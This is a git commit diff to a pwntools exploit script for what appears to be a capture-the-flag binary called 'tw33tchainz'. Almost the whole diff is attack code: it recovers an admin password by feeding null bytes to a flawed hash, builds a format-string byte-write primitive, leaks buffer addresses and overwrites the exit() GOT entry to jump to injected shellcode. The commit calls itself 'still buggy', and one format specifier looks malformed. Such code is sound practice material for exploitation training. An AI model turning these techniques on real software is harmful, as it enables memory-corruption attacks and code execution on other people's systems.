e39a3bd510fa9b9656e874141b912d8fd15adaf0
JustBeYou <mihailferaru2000@gmail.com>
2018-06-18 14:03:24 +0300

    Implement GOT rewrite (still buggy)

--- project1/solve.py
+++ project1/solve.py
@@ -3,6 +3,7 @@
 # This exploit template was generated via:
 # $ pwn template tw33tchainz
 from pwn import *
+from re import search
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('tw33tchainz')
@@ -24,7 +25,7 @@ def start(argv=[], *a, **kw):
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
-break *0x{exe.symbols.main:x}
+break *0x{exe.symbols.print_exit:x}
 continue
 '''.format(**locals())
 
@@ -42,8 +43,25 @@ context.terminal = ["xfce4-terminal", "-e"]
 libc =  ELF("/usr/lib32/libc.so.6")
 rop  =  ROP(libc)
 io = start()
+CHOICE_MSG = "Enter Choice: "
 
 def crack_password():
+    """
+    hashing pseudo-code:
+        for (int i = 0; i < 16; i++) {
+            ecx = salt[i] & 0xff;
+            ecx = ecx + secretpass[i] & 0xff;
+            eax = username[i] & 0xff;
+            eax = eax ^ ecx;
+
+            hash[i] = eax;
+        }
+
+    The user input is collected using fgets, so it won't stop at \x00 bytes
+    Then, by supplying 2 buffers full of \x00 bytes, the returned hash will
+    be the actual secretpass
+    """
+
     username = "\x00" * 0x0f
     salt     = "\x00" * 0x0f
 
@@ -57,6 +75,7 @@ def crack_password():
     log.info("Got password: " + password)
 
     secret = ''
+    # decode the little-endian encoding
     for elem in [password[i:i+8] for i in range(0, len(password), 8)]:
         secret += p32(int(elem, 16))
     log.info("Recovered: " + secret)
@@ -65,16 +84,22 @@ def crack_password():
 
 
 def do_tweet(msg):
-    io.recvuntil("Enter Choice: ")
+    io.recvuntil(CHOICE_MSG)
     io.sendline("1")
     io.recvuntil("Enter tweet data (16 bytes): ")
-    io.sendline(msg)
-    io.recvuntil("Please do not try to lop off our birdies heads :(\n")
-    io.sendline()
+    if len(msg) > 16: log.error("You are tweeting something too big")
+    if len(msg) < 16: msg += "\n"
+    io.send(msg)
+
+    if "\n" in msg:
+        io.recvuntil("Please do not try to lop off our birdies heads :(\n")
+        io.sendline()
+    else:
+        io.sendline()
     log.info("Tweeted: " + msg)
 
 def get_admin(password):
-    io.recvuntil("Enter Choice: ")
+    io.recvuntil(CHOICE_MSG)
     io.sendline("3")
     io.recvuntil("Enter password: ")
     io.sendline(password)
@@ -85,10 +110,34 @@ def get_admin(password):
         return False
     return True
 
-def leak_argN(n):
-    craft = "AAAA%{}$x".format(n)
+def enable_debug_mode():
+    io.recvuntil(CHOICE_MSG)
+    io.sendline("6")
+    log.info("Enabled debug mode in app")
+    io.sendline()
+
+def get_chain_addresses():
+    io.recvuntil(CHOICE_MSG)
+    io.sendline("2")
+    data = io.recv()
+
+    match = search(r"Address: 0x([0-9a-f]+)", data)
+    log.info("Leaked: " + str(match.groups()))
+    io.sendline()
+
+    return list(match.groups())
+
+def write_byte(addr, value):
+    craft = "A{}%{}x%8$hnn".format(p32(addr), value - 5)
+    log.info("Sending {} with len {}".format(craft, len(craft)))
     do_tweet(craft)
-    io.recvuntil("AAAA")
+    log.info("Written {} at {}".format(hex(value), hex(addr)))
+
+# --- debug purpose functions ---
+def leak_argN(n):
+    craft = "AAAAA%{}$x".format(n)
+    do_tweet(craft)
+    io.recvuntil("AAAAA")
 
     return io.recvline().rstrip()[:-9]
 
@@ -99,13 +148,38 @@ def dump_stack(args):
 
     for (i, dump) in enumerate(data):
         print ("{} | {} ({})".format(i + 1, dump, p32(int(dump, 16))))
+# ---
 
 secret = crack_password()
 if not get_admin(secret):
-    log.error("Failed to get admin")
+    log.error("Failed to get admin. Run again, sometimes it fails")
     exit(-1)
 
-dump_stack(range(1, 20))
+# There is a format string vulnerability in status message (only in admin mode). It allows us to write 16 bytes of data.
+# That is enough to write 2 bytes a time. We could rewrite GOT entry for exit() and redirect execution to one of buffers
+# controlled by us.
 
-#io.interactive()
+# First, let's enable debug mode in the app, this will allow leaking of tweets addresses
+enable_debug_mode()
+
+# Now, we should write our shellcode into the memory, it need to be smaller than 16 bytes
+do_tweet("\xcc" * 16)
+
+# Obtain shellcode address
+addresses = get_chain_addresses()
+shellcode_addr = int(addresses[0], 16)
+
+# Rewrite the GOT
+exit_GOT = exe.got['exit']
+log.info("exit@GOT: " + hex(exit_GOT))
+for i in range(0, 4):
+    to_write = (shellcode_addr >> (8 * i)) & 0xff
+    log.info("Byte to write: " + hex(to_write))
+    write_byte(exit_GOT + i, to_write)
+
+# Call shellcode
+io.recvuntil(CHOICE_MSG)
+io.sendline("5")
+
+io.interactive()
 
